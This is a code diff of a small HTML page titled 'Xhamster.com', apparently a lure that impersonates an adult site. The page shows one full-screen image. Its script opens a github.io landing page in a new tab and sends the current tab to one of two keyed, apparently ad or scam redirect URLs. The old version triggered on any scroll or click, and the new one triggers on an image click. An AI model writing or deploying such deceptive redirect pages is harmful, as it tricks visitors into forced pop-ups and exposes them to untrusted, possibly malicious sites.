@@ -3,73 +3,47 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <title>Xhamster.com</title>
 
 <style>
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-}
-
 body{
+    margin:0;
     background:#000;
-    overflow-x:hidden;
 }
 
 img{
     width:100%;
-    height:100vh;
+    height:100%;
     object-fit:cover;
-    display:block;
 }
 </style>
 </head>
 
 <body>
 
-<img src="1.jpg" id="triggerImage">
+<img src="1.jpg" onclick="openLinks()">
 
 <script>
-(function () {
-
-    let opened = false;
+function openLinks(){
 
     // New tab landing page
-    const newTabLink = "https://tme-join.github.io/dgngbf/";
+    window.open(
+        "https://tme-join.github.io/ghnnnm/",
+        "_blank"
+    );
 
-    // 50/50 random current tab links
-    const currentTabLinks = [
+    // 50/50 random redirect
+    const links = [
         "https://sitefleck.com/qwpmezpg?key=ff4552c4f5069bba65ae8a584a919868",
         "https://seenimplieddump.com/v3a38gvf?key=6c21c7841863a8a4041248cb754691b4"
     ];
 
-    function triggerRedirect() {
+    const randomLink =
+        links[Math.floor(Math.random() * links.length)];
 
-        if (opened) return;
-        opened = true;
-
-        // Open new tab first
-        window.open(newTabLink, "_blank");
-
-        // Select random current-tab link
-        const randomLink =
-            currentTabLinks[Math.floor(Math.random() * currentTabLinks.length)];
-
-        // Small delay before redirect
-        setTimeout(function () {
-            window.location.href = randomLink;
-        }, 300);
-    }
-
-    // Trigger on scroll
-    window.addEventListener("scroll", triggerRedirect);
-
-    // Trigger on click
-    document.addEventListener("click", triggerRedirect);
-
-})();
+    window.location.href = randomLink;
+}
 </script>
+
 </body>
 </html>
